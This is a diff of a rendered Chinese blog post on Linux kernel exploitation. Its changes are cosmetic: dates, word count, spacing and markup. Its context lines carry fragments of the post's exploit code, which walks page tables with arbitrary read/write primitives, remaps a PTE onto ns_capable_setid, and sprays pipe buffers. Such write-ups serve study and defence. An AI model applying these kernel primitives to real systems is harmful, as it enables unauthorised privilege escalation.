@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/kernel01/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-11-09T09:15:58+08:00" />
-<meta property="article:modified_time" content="2024-02-04T05:41:01+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2024-02-04T05:46:51+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "kernel","wordcount":  14313 ,
-        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2024-02-04T05:41:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "posts","keywords": "kernel","wordcount":  14205 ,
+        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2024-02-04T05:46:51+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -113,7 +113,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kernel01</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Categories</a>&nbsp;<a href="/categories/kernel/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>kernel</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-11-09">2023-11-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 14313 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-11-09">2023-11-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 14205 字&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 29 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -191,13 +191,13 @@
                   <ul>
                     <li><a href="#页表解析-1">页表解析</a>
                       <ul>
-                        <li><a href="#首先获取ns_capable_setid的物理地址">首先获取ns_capable_setid的物理地址</a></li>
-                        <li><a href="#获取mmap的物理地址并修改其指向ns_capable_setid的物理地址">获取mmap的物理地址，并修改其指向ns_capable_setid的物理地址</a></li>
+                        <li><a href="#首先获取-ns_capable_setid-的物理地址">首先获取 ns_capable_setid 的物理地址</a></li>
+                        <li><a href="#获取-mmap-的物理地址并修改其指向-ns_capable_setid-的物理地址">获取 mmap 的物理地址，并修改其指向 ns_capable_setid 的物理地址</a></li>
                       </ul>
                     </li>
                   </ul>
                 </li>
-                <li><a href="#完整exp">完整exp</a></li>
+                <li><a href="#完整-exp">完整 exp</a></li>
               </ul>
             </li>
           </ul>
@@ -818,8 +818,8 @@
 <p>vmemmap_base 是存放 page 结构体的基地址</p>
 <p>page_offset_base: 是线性映射区的基地址 可以理解为内核堆栈代码段等的基地址</p>
 <p>物理地址 + page_offset_base = 线性映射区地址</p>
-<p>pgd-&gt;pud-&gt;pmd 里面存放的是物理地址</p>
-<p>pte里面存放的可能是数据也可能是地址 取决于pte属于什么段，如果是数据段里面的存放的就是数据或者代码。如果是mmap 则存放的是物理地址</p>
+<p>pgd-&gt; pud-&gt; pmd 里面存放的是物理地址</p>
+<p>pte 里面存放的可能是数据也可能是地址 取决于 pte 属于什么段，如果是数据段里面的存放的就是数据或者代码。如果是 mmap 则存放的是物理地址</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4167,10 +4167,10 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="页表解析-1">页表解析</h5>
-<p>Q: 暂时不知道为什么解析到pte_addr之后获取到的就是kerenel_base对应的页表了</p>
-<p>按理来说通过读取pte可以获取到page的地址，然后加上最后的偏移即可获取到所对应的物理地址</p>
-<h6 id="首先获取ns_capable_setid的物理地址">首先获取ns_capable_setid的物理地址</h6>
-<p>pgd-&gt;pud-&gt;pmd-&gt;pte</p>
+<p>Q: 暂时不知道为什么解析到 pte_addr 之后获取到的就是 kerenel_base 对应的页表了</p>
+<p>按理来说通过读取 pte 可以获取到 page 的地址，然后加上最后的偏移即可获取到所对应的物理地址</p>
+<h6 id="首先获取-ns_capable_setid-的物理地址">首先获取 ns_capable_setid 的物理地址</h6>
+<p>pgd-&gt; pud-&gt; pmd-&gt; pte</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -4212,10 +4212,10 @@
 </span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">phy_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span><span class="c1">//ns_capable_setid的物理地址
+</span></span><span class="line"><span class="cl">    <span class="n">phy_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span><span class="c1">//ns_capable_setid 的物理地址
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h6 id="获取mmap的物理地址并修改其指向ns_capable_setid的物理地址">获取mmap的物理地址，并修改其指向ns_capable_setid的物理地址</h6>
+</div><h6 id="获取-mmap-的物理地址并修改其指向-ns_capable_setid-的物理地址">获取 mmap 的物理地址，并修改其指向 ns_capable_setid 的物理地址</h6>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -4264,7 +4264,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//==kernel_base ;
+</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//== kernel_base ;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
@@ -4291,34 +4291,33 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>修改之前</p>
-<p>pte-&gt;mmap_addr</p>
-<p><img
+<p>pte-&gt; mmap_addr
+<img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/kernel01/image/image-20240204052633271.png"
         data-srcset="/kernel01/image/image-20240204052633271.png, /kernel01/image/image-20240204052633271.png 1.5x, /kernel01/image/image-20240204052633271.png 2x"
         data-sizes="auto"
         alt="/kernel01/image/image-20240204052633271.png"
-        title="image-20240204052633271" width="910" height="346" /></p>
-<p><img
+        title="image-20240204052633271" width="910" height="346" />
+<img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/kernel01/image/image-20240204052341233.png"
         data-srcset="/kernel01/image/image-20240204052341233.png, /kernel01/image/image-20240204052341233.png 1.5x, /kernel01/image/image-20240204052341233.png 2x"
         data-sizes="auto"
         alt="/kernel01/image/image-20240204052341233.png"
-        title="image-20240204052341233" width="1258" height="628" /></p>
-<p>修改之后</p>
-<p>pte-&gt;mmap_page_addr</p>
-<p><img
+        title="image-20240204052341233" width="1258" height="628" />修改之后
+pte-&gt; mmap_page_addr
+<img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/kernel01/image/image-20240204052521824.png"
         data-srcset="/kernel01/image/image-20240204052521824.png, /kernel01/image/image-20240204052521824.png 1.5x, /kernel01/image/image-20240204052521824.png 2x"
         data-sizes="auto"
         alt="/kernel01/image/image-20240204052521824.png"
-        title="image-20240204052521824" width="1140" height="346" />物理地址</p>
-<p><img
+        title="image-20240204052521824" width="1140" height="346" /> 物理地址
+<img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/kernel01/image/image-20240204052258846.png"
@@ -4326,7 +4325,7 @@
         data-sizes="auto"
         alt="/kernel01/image/image-20240204052258846.png"
         title="image-20240204052258846" width="1360" height="354" /></p>
-<h4 id="完整exp">完整exp</h4>
+<h4 id="完整-exp">完整 exp</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -4719,8 +4718,8 @@
 </span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x20</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// for(int i = 0;i &lt; 200;i++){
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) &lt; 0) {
+</span></span><span class="line"><span class="cl">    <span class="c1">// for(int i = 0; i &lt; 200; i++){
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss [i]) &lt; 0) {
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//       perror(&#34;[-] socketpair&#34;);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//       return -1;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//   }
@@ -4913,9 +4912,9 @@
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">find_addr</span> <span class="o">&amp;&amp;</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])){</span>
 </span></span><span class="line"><span class="cl">            <span class="c1">//cred_addr page_offset_base
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">page_offset_base</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffff0000000</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="c1">//mm_sturct_addr的地址
+</span></span><span class="line"><span class="cl">            <span class="c1">//mm_sturct_addr 的地址
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">mm_struct_addr</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mh">0x4e</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">            <span class="c1">//page_offset_base + 0x1000*i 获取task_struct所在的页
+</span></span><span class="line"><span class="cl">            <span class="c1">//page_offset_base + 0x1000*i 获取 task_struct 所在的页
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">comm_addr</span> <span class="o">=</span> <span class="n">find_addr</span> <span class="o">-</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mh">0x1000</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;page_offset_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;comm_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">comm_addr</span><span class="p">);</span>
@@ -4965,21 +4964,21 @@
 </span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">// dst_addr = mmap_addr + 0x1000;// ns_capable_setid
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pgd_addr),buf);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pud_addr = (data[PGD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pgd_addr), buf);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pud_addr = (data [PGD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pud_addr += page_offset_base;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pud_addr),buf);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmd_addr = (data[PUD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read(dirt(pud_addr), buf);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmd_addr = (data [PUD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pmd_addr += page_offset_base;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read((void*) dirt(pmd_addr), buf);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pte_addr = (data[PMD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pte_addr = (data [PMD_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr = pte_addr + 0x1000 * PTE_ENTRY(dst_addr);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// pte_addr += page_offset_base;//==kernel_base ; + 0xeab50 == __sys_setre
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_read((void*) dirt(pte_addr), buf);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr = (data[PTE_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr = (data [PTE_ENTRY(dst_addr)] &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// page_addr += page_offset_base;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// data[PTE_ENTRY(dst_addr)] = (phy_addr + 0x1000) | 0x8000000000000867;
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_write(dirt(pte_addr),data,0xff0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// data [PTE_ENTRY(dst_addr)] = (phy_addr + 0x1000) | 0x8000000000000867;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// arb_write(dirt(pte_addr), data,0xff0);
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">obj_addr</span> <span class="o">=</span> <span class="n">page_addr</span> <span class="o">+</span> <span class="nf">PAGE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;pgd_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">pgd_addr</span><span class="p">);</span>
@@ -5030,8 +5029,8 @@
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2024-02-04&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/1129223f5491e4a2a4385010541d8d9e07c44103" target="_blank" title="commit by cnitlrt(1258175307@qq.com) 1129223f5491e4a2a4385010541d8d9e07c44103: blog">
-                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>1129223</a></span>
+                <span>更新于 2024-02-04&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/c3a3a3ea0208557acb05385b9c2d9a3efab7a54c" target="_blank" title="commit by cnitlrt(1258175307@qq.com) c3a3a3ea0208557acb05385b9c2d9a3efab7a54c: blog">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>c3a3a3e</a></span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
